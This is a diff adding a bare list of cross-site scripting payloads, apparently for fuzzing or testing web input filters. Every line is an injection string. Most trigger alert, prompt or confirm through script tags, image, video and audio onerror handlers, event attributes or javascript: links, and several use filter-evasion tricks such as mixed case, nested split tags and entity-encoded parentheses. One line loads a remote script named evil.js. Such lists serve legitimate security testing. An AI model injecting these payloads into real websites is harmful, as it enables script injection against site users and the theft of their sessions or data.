@@ -1,0 +1,17 @@
+<svg><script>alert&#40/1/&#41</script>
+<script>alert(1);</script>
+<script>prompt(1);</script>
+<script>confirm(1);</script>
+<scriptsrc="http://rhainfosec.com/evil.js">
+<scRiPt>alert(1);</scrIPt>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<a href="http://www.google.com">Clickme</a>
+<a href="javascript:alert(1)">Clickme</a>
+<a href="rhainfosec.com" onmouseover=alert(1)>ClickHere</a>
+<a href="rhainfosec.com" onclimbatree=alert(1)>ClickHere</a>
+<body/onhashchange=alert(1)><a href=#>clickit
+<img src=x onerror=prompt(1);>
+<img/src=aaa.jpg onerror=prompt(1);> 
+<video src=x onerror=prompt(1);>
+<audio src=x onerror=prompt(1);>
+
